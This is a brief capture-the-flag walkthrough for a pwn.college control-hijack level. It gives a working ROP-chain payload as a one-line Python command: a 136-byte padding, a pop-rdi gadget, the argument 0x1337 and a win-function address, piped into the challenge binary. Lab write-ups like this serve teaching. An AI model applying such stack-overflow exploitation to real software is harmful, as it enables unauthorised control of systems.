# Stage 12: Tricky Control Hijack (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack-2` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-control-hijack-2`. A small ROP chain: 136 bytes of `A` padding, then the `POP_RDI_GADGET` at `0x4022f3`, the `SECRET_VALUE` `0x1337`, and finally `WIN_AUTHED` at `0x401fce` — all packed little-endian, per the original solution's own variable names.

## Solution

```bash
python3 -c "import sys, struct; p64 = lambda x: struct.pack('<Q', x); OFFSET = 136; POP_RDI_GADGET = 0x4022f3; SECRET_VALUE = 0x1337; WIN_AUTHED = 0x401fce; payload = b'A' * OFFSET + p64(POP_RDI_GADGET) + p64(SECRET_VALUE) + p64(WIN_AUTHED); sys.stdout.buffer.write(payload)" | /challenge/binary-exploitation-control-hijack-2
```
